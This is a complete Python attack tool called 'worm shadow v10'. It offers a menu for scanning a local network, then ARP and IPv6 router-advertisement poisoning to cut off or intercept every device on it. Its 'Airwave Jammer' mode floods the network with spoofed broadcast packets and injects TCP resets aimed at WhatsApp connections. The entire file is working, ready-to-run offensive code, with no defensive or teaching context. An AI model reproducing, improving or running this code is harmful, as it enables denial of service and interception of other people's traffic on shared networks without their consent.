#!/usr/bin/env python3
"""
arp_menu.py — v10 (Airwave Jammer: Broadcast Flood + TCP RST + ARP Poison)
"""

import argparse
import ipaddress
import os
import platform
import random
import signal
import subprocess
import sys
import threading
import time
from collections import Counter

import scapy.all as scapy
from scapy.all import (
    ARP, DNS, DNSQR, Ether, ICMP, ICMPv6EchoRequest, ICMPv6ND_NA, ICMPv6ND_RA,
    ICMPv6ND_RS, ICMPv6NDOptDstLLAddr, ICMPv6NDOptSrcLLAddr, IP, IPv6, Raw,
    TCP, UDP, conf, get_if_addr, get_if_hwaddr, getmacbyip, sendp, srp, srp1, sniff
)
from scapy.sendrecv import AsyncSniffer
from scapy.utils import PcapWriter

# ═══════════════════════ CONFIG ═══════════════════════
INTERVAL_AGGRESSIVE = 0.1
INTERVAL_BLOCK      = 0.3
INTERVAL_MITM       = 0.8
RA_INTERVAL         = 0.5
RESTORE_ROUNDS      = 5
RESTORE_INTERVAL    = 0.3
MDNS_TIMEOUT        = 2.0
IPV6_LEARN_TIMEOUT  = 4.0
MAX_HOSTS           = 200
VERIFY_WAIT         = 12
LOG_FILE            = "arp_mitm.log"
SELF_KILL_RULE_NAME = "__wormshadow_self_kill"
# ══════════════════════════════════════════════════════

if platform.system() == "Windows":
    os.system("")

class C:
    R = "\033[0m";  B = "\033[1m";  D = "\033[2m"
    RED = "\033[91m";  GRN = "\033[92m";  YEL = "\033[93m"
    BLU = "\033[94m";  MAG = "\033[95m";  CYN = "\033[96m"
    WHT = "\033[97m";  GRY = "\033[90m"

STATE_PCAP = None
SELF_KILLED = False
WATCHDOG_SEC = 0
MODE = None
STOP_EVENT = None
LOG_FP = None
SEND_ERRORS = 0
STATS = Counter()
STATS["recv_from"] = Counter()
STATS_LOCK = threading.Lock()
PRINT_LOCK = threading.Lock()

class Ctx:
    def __init__(self, name):
        self.name = name; self.mac = None; self.ip = None
        self.subnet = None; self.gw_ip = None; self.gw_mac = None
        self.gw_v6 = None; self.hosts = {}
        self.sniffer = None; self.threads = []; self.kernel_fwd = None

CTXS = []

def log(msg, color=None):
    line = f"{color}{msg}{C.R}" if color else msg
    with PRINT_LOCK: print(line, flush=True)

def ask(p):
    try: return input(p).strip()
    except (EOFError, KeyboardInterrupt): return "0"

def run_cmd(cmd, timeout=6):
    try: return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except: return None

def safe_sendp(pkt, iface):
    global SEND_ERRORS
    try:
        sendp(pkt, iface=iface, verbose=False)
        return True
    except: return False

# ═══════════ kernel forwarding ═══════════
def disable_kernel_forward():
    if platform.system().lower() != "linux": return None
    try:
        with open("/proc/sys/net/ipv4/ip_forward") as f: prev = f.read().strip()
    except: return None
    if prev == "1": run_cmd(["sysctl", "-w", "net.ipv4.ip_forward=0"])
    return prev

def restore_kernel_forward(prev):
    if platform.system().lower() != "linux" or prev is None: return
    if prev == "1": run_cmd(["sysctl", "-w", "net.ipv4.ip_forward=1"])

# ═══════════ ARP table ═══════════
def read_os_arp_all():
    result = {}
    if platform.system().lower() == "windows":
        r = run_cmd(["arp", "-a"])
        if r:
            for line in r.stdout.splitlines():
                parts = line.split()
                if len(parts) >= 2 and parts[0].count(".") == 3:
                    try: ipaddress.ip_address(parts[0])
                    except: continue
                    mac = parts[1].replace("-", ":").lower()
                    if mac.count(":") == 5 and mac != "ff:ff:ff:ff:ff:ff":
                        result[parts[0]] = mac
    else:
        r = run_cmd(["arp", "-n"])
        if r:
            for line in r.stdout.splitlines():
                if "ether" in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        try:
                            idx = parts.index("ether"); mac = parts[idx + 1].lower()
                            if mac.count(":") == 5 and mac != "ff:ff:ff:ff:ff:ff":
                                result[parts[0]] = mac
                        except: pass
    return result

def read_os_arp(ip): return read_os_arp_all().get(ip)

def ping_host(ip):
    if platform.system().lower() == "windows": run_cmd(["ping", "-n", "1", "-w", "800", ip])
    else: run_cmd(["ping", "-c", "1", "-W", "1", ip])

def ping_sweep(subnet, max_hosts):
    try: all_h = [str(h) for h in subnet.hosts()][:max_hosts]
    except: return
    batch = []
    for ip in all_h:
        t = threading.Thread(target=ping_host, args=(ip,), daemon=True)
        t.start(); batch.append(t)
        if len(batch) >= 40:
            for th in batch: th.join(timeout=1.0)
            batch = []
    for th in batch: th.join(timeout=1.0)
    time.sleep(0.5)

def resolve_mac(ip, iface, retries=4):
    mac = read_os_arp(ip)
    if mac: return mac
    ping_host(ip); time.sleep(0.3)
    mac = read_os_arp(ip)
    if mac: return mac
    try:
        mac = getmacbyip(ip)
        if mac and mac.count(":") == 5 and mac != "ff:ff:ff:ff:ff:ff": return mac.lower()
    except: pass
    for _ in range(retries):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), iface=iface, timeout=1, verbose=False)
            if ans: return ans[0][1].hwsrc.lower()
        except: pass
        time.sleep(0.3)
    return None

# ═══════════ scan ═══════════
def scan_ctx(ctx):
    log(f"  [*] passive sniff on {ctx.name} (3s) ...", C.D)
    hosts = {}
    def cb(p):
        try:
            if p.haslayer(ARP): hosts[p[ARP].psrc] = p[ARP].hwsrc.lower()
            elif p.haslayer(Ether) and p[Ether].type == 0x0800 and p.haslayer(IP):
                hosts[p[IP].src] = p[Ether].src.lower()
        except: pass
    try: sniff(iface=ctx.name, prn=cb, timeout=3, store=0)
    except: pass

    log(f"  [*] ping sweep {ctx.subnet} on {ctx.name} ...", C.D)
    ping_sweep(ctx.subnet, MAX_HOSTS)
    os_hosts = read_os_arp_all()
    scapy_hosts = {}
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(ctx.subnet)), iface=ctx.name, timeout=3, retry=1, verbose=False)
        for _, rcv in ans:
            if rcv.hwsrc != "00:00:00:00:00:00": scapy_hosts[rcv.psrc] = rcv.hwsrc.lower()
    except: pass

    merged = dict(os_hosts); merged.update(hosts); merged.update(scapy_hosts)
    result = {}
    for ip, mac in merged.items():
        try:
            if ipaddress.IPv4Address(ip) in ctx.subnet and ip not in (ctx.ip, ctx.gw_ip):
                result[ip] = mac
        except: continue
        if len(result) >= MAX_HOSTS: break
    ctx.hosts = result

    if ctx.gw_v6 is None:
        log(f"  [*] learning gateway IPv6 on {ctx.name} ...", C.D)
        ctx.gw_v6 = learn_gateway_ipv6(ctx.name, ctx.gw_mac)

# ═══════════ IPv6 helpers ═══════════
def mac_to_linklocal(mac):
    try:
        mac = mac.replace("-", ":").lower()
        p = [int(x, 16) for x in mac.split(":")]
        p[0] ^= 0x02
        h = p[:3] + [0xff, 0xfe] + p[3:]
        val = (0xfe80 << 112) | (h[0] << 56) | (h[1] << 48) | (h[2] << 40) | (h[3] << 32) | (h[4] << 24) | (h[5] << 16) | (h[6] << 8) | h[7]
        return str(ipaddress.IPv6Address(val))
    except: return None

def learn_gateway_ipv6(iface, gw_mac):
    gw_lc = gw_mac.lower()
    eui64 = mac_to_linklocal(gw_lc)
    if eui64:
        pkt = Ether(dst=gw_lc) / IPv6(dst=eui64) / ICMPv6EchoRequest()
        ans = srp1(pkt, iface=iface, timeout=1.5, verbose=False)
        if ans and IPv6 in ans:
            log(f"  {C.GRN}[v6] validated: {eui64}{C.R}")
            return eui64
    if platform.system().lower() == "windows":
        r = run_cmd(["netsh", "interface", "ipv6", "show", "neighbors"])
        if r and r.stdout:
            for line in r.stdout.splitlines():
                p = line.split()
                if len(p) >= 2 and p[1].replace("-", ":").lower() == gw_lc and p[0].startswith("fe80"):
                    log(f"  {C.GRN}[v6] cache: {p[0]}{C.R}"); return p[0]
    else:
        r = run_cmd(["ip", "-6", "neigh", "show"])
        if r and r.stdout:
            for line in r.stdout.splitlines():
                if gw_lc in line.lower() and "fe80" in line:
                    parts = line.split()
                    if parts and parts[0].startswith("fe80"):
                        log(f"  {C.GRN}[v6] cache: {parts[0]}{C.R}"); return parts[0]
    result = {"a": None}
    try: sendp(Ether(dst="33:33:00:00:00:02") / IPv6(src="::", dst="ff02::2") / ICMPv6ND_RS(), iface=iface, verbose=False)
    except: pass
    def cb(p):
        if result["a"]: return
        if p.haslayer(Ether) and p.haslayer(IPv6) and p[Ether].src.lower() == gw_lc:
            if p[IPv6].src.startswith("fe80"): result["a"] = p[IPv6].src
    try: sniff(iface=iface, prn=cb, timeout=IPV6_LEARN_TIMEOUT, store=0)
    except: pass
    if result["a"]:
        log(f"  {C.GRN}[v6] from RA: {result['a']}{C.R}"); return result["a"]
    if eui64:
        log(f"  {C.YEL}[v6] EUI-64 fallback: {eui64}{C.R}"); return eui64
    return None

def send_ra_poison(iface, my_mac, src_v6, dst_v6, dst_mac, lifetime=180):
    try:
        pkt = Ether(src=my_mac, dst=dst_mac) / IPv6(src=src_v6, dst=dst_v6, hlim=255) / \
              ICMPv6ND_RA(chlim=64, M=0, O=0, prf=0, routerlifetime=lifetime, reachabletime=0, retranstimer=0)
        try: pkt = pkt / ICMPv6NDOptSrcLLAddr(lladdr=my_mac)
        except: pass
        safe_sendp(pkt, iface)
    except: pass

def send_na_poison(iface, my_mac, src_v6, dst_v6, dst_mac):
    try:
        pkt = Ether(src=my_mac, dst=dst_mac) / IPv6(src=src_v6, dst=dst_v6, hlim=255) / \
              ICMPv6ND_NA(tgt=src_v6, R=0, S=0, O=1)
        try: pkt = pkt / ICMPv6NDOptDstLLAddr(lladdr=my_mac)
        except: pass
        safe_sendp(pkt, iface)
    except: pass

def send_ra_restore(iface, src_v6, real_mac, dst_v6, dst_mac, lifetime=1800):
    try:
        pkt = Ether(src=real_mac, dst=dst_mac) / IPv6(src=src_v6, dst=dst_v6, hlim=255) / \
              ICMPv6ND_RA(chlim=64, M=0, O=0, prf=0, routerlifetime=lifetime, reachabletime=0, retranstimer=0)
        try: pkt = pkt / ICMPv6NDOptSrcLLAddr(lladdr=real_mac)
        except: pass
        sendp(pkt, iface=iface, verbose=False)
    except: pass

# ═══════════ SELF-KILL ═══════════
def do_self_kill():
    global SELF_KILLED
    if SELF_KILLED: return
    log("  [*] KILLING own internet (firewall) ...", C.D)
    ok = False
    if platform.system().lower() == "windows":
        r = run_cmd(["netsh", "advfirewall", "firewall", "add", "rule",
                     f"name={SELF_KILL_RULE_NAME}", "dir=out", "action=block",
                     "enable=yes", "profile=any"], timeout=10)
        ok = r and r.returncode == 0
    else:
        r = run_cmd(["iptables", "-I", "OUTPUT", "-j", "DROP"], timeout=5)
        run_cmd(["ip6tables", "-I", "OUTPUT", "-j", "DROP"], timeout=5)
        ok = r and r.returncode == 0
    if ok:
        SELF_KILLED = True
        log(f"  {C.RED}[+] SELF INTERNET KILLED{C.R}")
    else:
        log(f"  {C.RED}[!] SELF-KILL FAILED — run as Admin/root!{C.R}")

def do_self_restore():
    global SELF_KILLED
    if not SELF_KILLED: return
    log("  [*] restoring own internet ...", C.D)
    if platform.system().lower() == "windows":
        run_cmd(["netsh", "advfirewall", "firewall", "delete", "rule", f"name={SELF_KILL_RULE_NAME}"], timeout=10)
    else:
        run_cmd(["iptables", "-D", "OUTPUT", "-j", "DROP"], timeout=5)
        run_cmd(["ip6tables", "-D", "OUTPUT", "-j", "DROP"], timeout=5)
    SELF_KILLED = False
    log(f"  {C.GRN}[+] self internet restored{C.R}")

# ═══════════ packet handler ═══════════
def handle_pkt_for(ctx, pkt):
    try:
        if not pkt.haslayer(Ether): return
        ether = pkt[Ether]

        if pkt.haslayer(ARP) and MODE in ("block", "mitm", "aggressive_kill"):
            arp = pkt[ARP]
            if arp.op == 1:
                hm = set(ctx.hosts.values())
                if arp.pdst == ctx.gw_ip and ether.src.lower() in hm:
                    safe_sendp(Ether(dst=ether.src) / ARP(op=2, hwsrc=ctx.mac, psrc=ctx.gw_ip, hwdst=ether.src, pdst=arp.psrc), ctx.name)
                elif ether.src.lower() == ctx.gw_mac.lower() and arp.pdst in ctx.hosts:
                    safe_sendp(Ether(dst=ctx.gw_mac) / ARP(op=2, hwsrc=ctx.mac, psrc=arp.pdst, hwdst=ctx.gw_mac, pdst=arp.psrc), ctx.name)
            return

        # Bypass DNS parsing during DoS to avoid loop
        if MODE == "dos_router":
            return

        if ether.type == 0x86DD and pkt.haslayer(IPv6) and ether.src.lower() == ctx.gw_mac.lower():
            s6 = pkt[IPv6].src
            if s6.startswith("fe80") and ctx.gw_v6 != s6: ctx.gw_v6 = s6

        if ether.dst != ctx.mac or ether.src == ctx.mac: return
        ip_layer = pkt[IP] if ether.type == 0x0800 and pkt.haslayer(IP) else (pkt[IPv6] if ether.type == 0x86DD and pkt.haslayer(IPv6) else None)
        if not ip_layer: return

        with STATS_LOCK:
            STATS["recv_from"][ip_layer.src] += 1
            STATS["captured"] += 1

        if MODE != "mitm":
            with STATS_LOCK: STATS["dropped"] += 1
            return

        if ether.src == ctx.gw_mac:
            hm = ctx.hosts.get(ip_layer.dst)
            if hm:
                pkt[Ether].src = ctx.mac; pkt[Ether].dst = hm
                safe_sendp(pkt, ctx.name)
                with STATS_LOCK: STATS["forwarded"] += 1
            else:
                with STATS_LOCK: STATS["dropped"] += 1
        elif ether.src in set(ctx.hosts.values()):
            if ip_layer.dst != ctx.ip:
                pkt[Ether].src = ctx.mac; pkt[Ether].dst = ctx.gw_mac
                safe_sendp(pkt, ctx.name)
                with STATS_LOCK: STATS["forwarded"] += 1
    except: pass

# ═══════════ poison loops ═══════════
def poison_loop_v4(ctx, stop_event):
    if MODE == "aggressive_kill": interval = INTERVAL_AGGRESSIVE
    elif MODE == "block": interval = INTERVAL_BLOCK
    else: interval = INTERVAL_MITM
    while not stop_event.is_set():
        for host_ip, host_mac in list(ctx.hosts.items()):
            safe_sendp(Ether(dst=host_mac) / ARP(op=2, hwsrc=ctx.mac, psrc=ctx.gw_ip, hwdst=host_mac, pdst=host_ip), ctx.name)
            safe_sendp(Ether(dst=ctx.gw_mac) / ARP(op=2, hwsrc=ctx.mac, psrc=host_ip, hwdst=ctx.gw_mac, pdst=ctx.gw_ip), ctx.name)
        stop_event.wait(interval)

def poison_loop_v6(ctx, stop_event):
    srcs = set()
    if ctx.gw_v6: srcs.add(ctx.gw_v6)
    e = mac_to_linklocal(ctx.gw_mac)
    if e: srcs.add(e)
    srcs = list(srcs) or ["fe80::1"]
    while not stop_event.is_set():
        if MODE not in ("block", "aggressive_kill"):
            stop_event.wait(RA_INTERVAL); continue
        for _, hm in ctx.hosts.items():
            dv = mac_to_linklocal(hm)
            for s in srcs:
                if dv:
                    send_ra_poison(ctx.name, ctx.mac, s, dv, hm)
                    send_na_poison(ctx.name, ctx.mac, s, dv, hm)
                else:
                    send_ra_poison(ctx.name, ctx.mac, s, "ff02::1", "33:33:00:00:00:01")
                    send_na_poison(ctx.name, ctx.mac, s, "ff02::1", "33:33:00:00:00:01")
        stop_event.wait(RA_INTERVAL)

# ═══════════ V10: AIRWAVE JAMMER ═══════════
def dos_router_loop(ctx, stop_event):
    gw = ctx.gw_ip; gw_mac = ctx.gw_mac; my_mac = ctx.mac
    bcast = str(ctx.subnet.broadcast_address)
    
    log(f"  {C.RED}[*] Pre-generating 20,000 max-size broadcast flood packets...{C.R}")
    payload = b"X" * 1400
    pkts_list = []
    for _ in range(4): # 4 threads
        pkts = []
        for _ in range(5000):
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            # Broadcast MAC + Broadcast IP = router and all devices must process
            p = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src=src_ip, dst=bcast) / UDP(sport=random.randint(1024,65535), dport=random.randint(1,65535)) / Raw(load=payload)
            pkts.append(p)
        pkts_list.append(pkts)

    def blast(pkt_list, tid):
        log(f"  {C.RED}[thread {tid}] blasting broadcast flood...{C.R}")
        while not stop_event.is_set():
            try:
                sendp(pkt_list, iface=ctx.name, inter=0, verbose=False)
            except: pass

    def poison_arp_rst():
        log(f"  {C.RED}[thread ARP] poisoning + TCP RST injection...{C.R}")
        while not stop_event.is_set():
            for host_ip, host_mac in list(ctx.hosts.items()):
                # Poison: gateway is at MY MAC (we drop, no forward)
                safe_sendp(Ether(dst=host_mac) / ARP(op=2, hwsrc=my_mac, psrc=gw, hwdst=host_mac, pdst=host_ip), ctx.name)
                # RST to kill WhatsApp existing connections
                for port in [443, 5222, 5223, 5228]:
                    safe_sendp(Ether(dst=host_mac) / IP(src=gw, dst=host_ip) / TCP(sport=port, dport=random.randint(1024,65535), flags="R", seq=random.randint(0, 2**32-1)), ctx.name)
            time.sleep(0.01) # 100 Hz

    log(f"  {C.RED}[+] AIRWAVE JAMMER ACTIVE — Broadcast Flood + ARP + TCP RST{C.R}")
    threads = [
        threading.Thread(target=blast, args=(pkts_list[0], 1), daemon=True),
        threading.Thread(target=blast, args=(pkts_list[1], 2), daemon=True),
        threading.Thread(target=blast, args=(pkts_list[2], 3), daemon=True),
        threading.Thread(target=blast, args=(pkts_list[3], 4), daemon=True),
        threading.Thread(target=poison_arp_rst, daemon=True)
    ]
    for t in threads: t.start()
    for t in threads: t.join()

# ═══════════ restore ═══════════
def restore_ctx(ctx):
    if not ctx.hosts: return
    log(f"  [*] restoring {ctx.name} ...", C.D)
    for _ in range(RESTORE_ROUNDS):
        for hip, hm in list(ctx.hosts.items()):
            try:
                sendp(Ether(dst=hm) / ARP(op=2, hwsrc=ctx.gw_mac, psrc=ctx.gw_ip, hwdst=hm, pdst=hip), iface=ctx.name, verbose=False)
                sendp(Ether(dst=ctx.gw_mac) / ARP(op=2, hwsrc=hm, psrc=hip, hwdst=ctx.gw_mac, pdst=ctx.gw_ip), iface=ctx.name, verbose=False)
            except: pass
            if ctx.gw_v6:
                dv = mac_to_linklocal(hm)
                if dv: send_ra_restore(ctx.name, ctx.gw_v6, ctx.gw_mac, dv, hm)
        time.sleep(RESTORE_INTERVAL)
    log(f"  [+] {ctx.name} restored.", C.GRN)

# ═══════════ start / stop ═══════════
def start_op(mode, all_ifaces=True):
    global MODE, STOP_EVENT, SEND_ERRORS
    stop_active(silent=True)
    SEND_ERRORS = 0
    MODE = mode

    total_targets = sum(len(c.hosts) for c in CTXS)
    if total_targets == 0 and mode != "dos_router":
        log("  [!] no targets — run [1] first", C.YEL); MODE = None; return

    log(f"  [*] starting {mode.upper()} on {len(CTXS)} iface / {total_targets} host(s)...", C.D)
    STOP_EVENT = threading.Event()

    # Sniffer (Only start if NOT dos_router to prevent DNS loop)
    if mode != "dos_router":
        for ctx in CTXS:
            try:
                sniffer = AsyncSniffer(iface=ctx.name, prn=lambda p, c=ctx: handle_pkt_for(c, p), store=0)
                sniffer.start(); ctx.sniffer = sniffer
            except Exception as e:
                log(f"  [!] sniffer failed on {ctx.name}: {e}", C.RED)
                for c in CTXS:
                    if c.sniffer:
                        try: c.sniffer.stop()
                        except: pass
                MODE = None; return
        time.sleep(1)

    if mode == "mitm":
        for ctx in CTXS: ctx.kernel_fwd = disable_kernel_forward()

    for ctx in CTXS:
        if mode == "dos_router":
            t_dos = threading.Thread(target=dos_router_loop, args=(ctx, STOP_EVENT), daemon=True)
            t_dos.start(); ctx.threads.append(t_dos)
        else:
            t4 = threading.Thread(target=poison_loop_v4, args=(ctx, STOP_EVENT), daemon=True)
            t4.start(); ctx.threads.append(t4)
            t6 = threading.Thread(target=poison_loop_v6, args=(ctx, STOP_EVENT), daemon=True)
            t6.start(); ctx.threads.append(t6)

    if mode in ("aggressive_kill", "dos_router"):
        do_self_kill()
        if mode == "aggressive_kill":
            log(f"  {C.RED}[+] AGRESSIVE KILL ACTIVE — EVERYTHING DEAD{C.R}")
        else:
            log(f"  {C.RED}[+] AIRWAVE JAMMER ACTIVE — TARGETS 100% LOSS{C.R}")
        log(f"  {C.RED}    press [6] or Ctrl+C to restore{C.R}")
    elif mode == "block":
        log("  [+] BLOCK active — devices cut, self internet OK", C.RED)
    else:
        log("  [+] MITM active — forwarding + logging", C.GRN)

    if WATCHDOG_SEC > 0:
        threading.Thread(target=watchdog_thread, args=(WATCHDOG_SEC,), daemon=True).start()

    threading.Thread(target=post_verify, args=(VERIFY_WAIT,), daemon=True).start()
    log(f"  [i] verify in {VERIFY_WAIT}s", C.GRY)

def watchdog_thread(sec):
    time.sleep(sec)
    if MODE is not None:
        log(f"\n  {C.RED}[!] WATCHDOG: {sec}s reached — auto-restoring{C.R}")
        stop_active(silent=False)

def post_verify(wait):
    time.sleep(wait)
    if MODE is None: return
    if MODE == "dos_router":
        log(f"  {C.RED}[verify] AIRWAVE JAMMER active — target should have 100% LOSS now.{C.R}")
    else:
        with STATS_LOCK: recv = dict(STATS["recv_from"])
        silent = [ip for c in CTXS for ip in c.hosts if recv.get(ip, 0) == 0]
        if not silent: log(f"  {C.GRN}[verify] all targets sending ✓{C.R}")
        else: log(f"  {C.RED}[verify] {len(silent)} silent{C.R}")

def stop_active(silent=False):
    global MODE, STOP_EVENT
    if MODE is None:
        if not silent: log("  [i] nothing active", C.GRY)
        return
    if not silent: log("  [*] stopping...", C.D)

    if STOP_EVENT is not None: STOP_EVENT.set()
    for ctx in CTXS:
        for t in ctx.threads: t.join(timeout=2)
        ctx.threads = []
        if ctx.sniffer:
            try: ctx.sniffer.stop()
            except: pass
            ctx.sniffer = None

    for ctx in CTXS: restore_ctx(ctx)
    for ctx in CTXS:
        restore_kernel_forward(ctx.kernel_fwd); ctx.kernel_fwd = None
    do_self_restore()

    MODE = None; STOP_EVENT = None
    if not silent: log("  [+] stopped and fully restored.", C.GRN)

# ═══════════ menu actions ═══════════
def do_scan():
    for ctx in CTXS:
        try: scan_ctx(ctx)
        except Exception as e: log(f"  [!] scan {ctx.name}: {e}", C.RED)

def diagnose():
    log("", None); log(f"  {C.B}=== DIAGNOSTICS ==={C.R}", None)
    for ctx in CTXS:
        log(f"  {C.B}{ctx.name}{C.R}", None)
        log(f"    my ip/mac : {ctx.ip} / {ctx.mac}", None)
        log(f"    gateway   : {ctx.gw_ip} @ {ctx.gw_mac}", None)
        log(f"    targets   : {len(ctx.hosts)}", None)
    log(f"  {C.B}self-kill status:{C.R} {'ACTIVE' if SELF_KILLED else 'off'}", None)
    log("", None)

def show_hosts():
    log("")
    for ctx in CTXS:
        print(f"  {C.B}[{ctx.name}] gateway {ctx.gw_ip} @ {ctx.gw_mac}{C.R}")
        print(f"  {C.B}┌─────┬──────────────────┬───────────────────┬───────┐{C.R}")
        print(f"  {C.B}│  #  │ IP               │ MAC               │ recv  │{C.R}")
        print(f"  {C.B}├─────┼──────────────────┼───────────────────┼───────┤{C.R}")
        if not ctx.hosts: print(f"  │  -  │ (no hosts)                                  │")
        else:
            with STATS_LOCK: recv = dict(STATS["recv_from"])
            for i, (ip, mac) in enumerate(sorted(ctx.hosts.items()), 1):
                r = recv.get(ip, 0); rc = C.GRN if r > 0 else C.GRY
                print(f"  │ {i:>3} │ {ip:<16} │ {mac:<17} │ {rc}{r:>5}{C.R} │")
        print(f"  {C.B}└─────┴──────────────────┴───────────────────┴───────┘{C.R}")
    print()

def show_menu():
    active = MODE or "idle"
    ac = {"mitm": C.GRN, "block": C.RED, "aggressive_kill": C.RED+C.B, "dos_router": C.MAG+C.B, "idle": C.GRY}.get(active, C.GRY)
    total_hosts = sum(len(c.hosts) for c in CTXS)
    iface_str = " + ".join(c.name for c in CTXS)
    print()
    print(f"{C.B}╔══════════════════════════════════════════════════════════════════╗{C.R}")
    print(f"{C.B}║{C.R}  {C.MAG}ARP + NDP Toolkit — worm shadow v10 (Airwave Jammer){C.R}            {C.B}║{C.R}")
    print(f"{C.B}╠══════════════════════════════════════════════════════════════════╣{C.R}")
    print(f"{C.B}║{C.R}  ifaces    : {C.CYN}{iface_str:<52}{C.R}{C.B}║{C.R}")
    print(f"{C.B}║{C.R}  state     : {ac}{active:<52}{C.R}{C.B}║{C.R}")
    print(f"{C.B}║{C.R}  hosts     : {C.CYN}{total_hosts:<52}{C.R}{C.B}║{C.R}")
    print(f"{C.B}║{C.R}  self-kill : {(C.RED+'ACTIVE'+C.R) if SELF_KILLED else C.GRY+'off'+C.R}{'':<44}{C.B}║{C.R}")
    print(f"{C.B}╠══════════════════════════════════════════════════════════════════╣{C.R}")
    print(f"{C.B}║{C.R}  {C.GRN}[1]{C.R} Scan all interfaces                                       {C.B}║{C.R}")
    print(f"{C.B}║{C.R}  {C.RED}[2]{C.R} Block ALL devices (self internet OK)                       {C.B}║{C.R}")
    print(f"{C.B}║{C.R}  {C.RED}[3]{C.R} Block 1 host                                              {C.B}║{C.R}")
    print(f"{C.B}║{C.R}  {C.GRN}[4]{C.R} Monitor MITM (forward + log)                              {C.B}║{C.R}")
    print(f"{C.B}║{C.R}  {C.RED}[5]{C.R} {C.B}AGRESSIVE KILL{C.R} — LAN+WiFi+self all dead (0.1s)          {C.B}║{C.R}")
    print(f"{C.B}║{C.R}  {C.YEL}[6]{C.R} Stop / Restore                                            {C.B}║{C.R}")
    print(f"{C.B}║{C.R}  {C.CYN}[7]{C.R} Show hosts + stats                                        {C.B}║{C.R}")
    print(f"{C.B}║{C.R}  {C.WHT}[8]{C.R} Diagnose                                                  {C.B}║{C.R}")
    print(f"{C.B}║{C.R}  {C.RED}[9]{C.R} {C.B}AIRWAVE JAMMER{C.R} — Broadcast Flood + RST + ARP (MAX KILL)   {C.B}║{C.R}")
    print(f"{C.B}║{C.R}  {C.GRY}[0]{C.R} Exit                                                      {C.B}║{C.R}")
    print(f"{C.B}╚══════════════════════════════════════════════════════════════════╝{C.R}")

def do_block_one():
    ip = ask("  IP: ")
    if not ip: return
    for ctx in CTXS:
        mac = ctx.hosts.get(ip) or resolve_mac(ip, ctx.name)
        if mac:
            ctx.hosts[ip] = mac
            saved = {c: dict(c.hosts) for c in CTXS}
            for c in CTXS: c.hosts = {ip: mac} if c is ctx else {}
            start_op("block")
            for c in CTXS: c.hosts = saved[c]
            return
    log(f"  [!] target {ip} not found", C.RED)

def menu_loop():
    while True:
        show_menu()
        ch = ask(f"  {C.B}>{C.R} ")
        if ch == "0": break
        elif ch == "1": do_scan()
        elif ch == "2": start_op("block")
        elif ch == "3": do_block_one()
        elif ch == "4": start_op("mitm")
        elif ch == "5":
            log(f"  {C.RED}!! AGRESSIVE KILL will cut YOUR OWN internet too !!{C.R}")
            if ask(f"  {C.RED}type 'YES' to confirm: {C.R}") == "YES":
                start_op("aggressive_kill")
        elif ch == "6": stop_active()
        elif ch == "7": show_hosts()
        elif ch == "8": diagnose()
        elif ch == "9":
            log(f"  {C.RED}!! AIRWAVE JAMMER akan menyumbat total bandwidth jaringan !!{C.R}")
            log(f"  {C.RED}!! Semua device (LAN, WiFi, dan PC ini) akan LOSS 100% !!{C.R}")
            if ask(f"  {C.RED}type 'YES' to confirm: {C.R}") == "YES":
                start_op("dos_router")
        else: log("  [?] unknown", C.GRY)
    stop_active(silent=True)

def _sig_handler(signum, frame):
    log(f"\n  [!] signal {signum} — emergency restore", C.RED)
    stop_active(silent=True)
    if STATE_PCAP:
        try: STATE_PCAP.close()
        except: pass
    if LOG_FP:
        try: LOG_FP.close()
        except: pass
    sys.exit(0)

# ═══════════ main ═══════════
def main():
    global LOG_FP, STATE_PCAP, WATCHDOG_SEC
    ap = argparse.ArgumentParser()
    ap.add_argument("--iface", required=True)
    ap.add_argument("--gateway", default=None)
    ap.add_argument("--pcap", default=None)
    ap.add_argument("--log", default=LOG_FILE)
    ap.add_argument("--max-hosts", type=int, default=MAX_HOSTS)
    ap.add_argument("--no-ipv6", action="store_true")
    ap.add_argument("--watchdog", type=int, default=0)
    args = ap.parse_args()
    WATCHDOG_SEC = args.watchdog

    names = [n.strip() for n in args.iface.split(",") if n.strip()]
    for name in names:
        try:
            ctx = Ctx(name); ctx.mac = get_if_hwaddr(name); ctx.ip = get_if_addr(name)
        except: continue
        if not ctx.ip or ctx.ip == "0.0.0.0": continue

        gw = args.gateway if (args.gateway and len(names) == 1) else None
        if not gw:
            try:
                g, _, _ = conf.route.route("0.0.0.0", dev=name)
                if g and g != "0.0.0.0": gw = g
            except: pass
        if not gw: continue

        iface_obj = conf.ifaces.dev_from_name(name)
        mask = getattr(iface_obj, "netmask", None) or "255.255.255.0"
        ctx.subnet = ipaddress.IPv4Network(f"{ctx.ip}/{mask}", strict=False)

        log(f"[*] {name}: {ctx.ip} / {ctx.mac}  gw={gw}", C.CYN)
        gw_mac = resolve_mac(gw, name)
        if not gw_mac: continue
        ctx.gw_ip = gw; ctx.gw_mac = gw_mac
        log(f"[+] {name}: gateway {gw} @ {gw_mac}", C.GRN)
        CTXS.append(ctx)

    if not CTXS: sys.exit("[!] no usable interface")

    if args.pcap:
        try: STATE_PCAP = PcapWriter(args.pcap, append=True, sync=True)
        except: pass

    try:
        LOG_FP = open(args.log, "a", encoding="utf-8")
        LOG_FP.write(f"\n===== session @ {time.strftime('%Y-%m-%d %H:%M:%S')} =====\n"); LOG_FP.flush()
    except: pass

    signal.signal(signal.SIGINT, _sig_handler)
    signal.signal(signal.SIGTERM, _sig_handler)

    log(f"\n[*] loaded {len(CTXS)} interface(s) — scanning ...", C.B)
    do_scan()
    try: menu_loop()
    finally: stop_active(silent=True)

if __name__ == "__main__":
    main()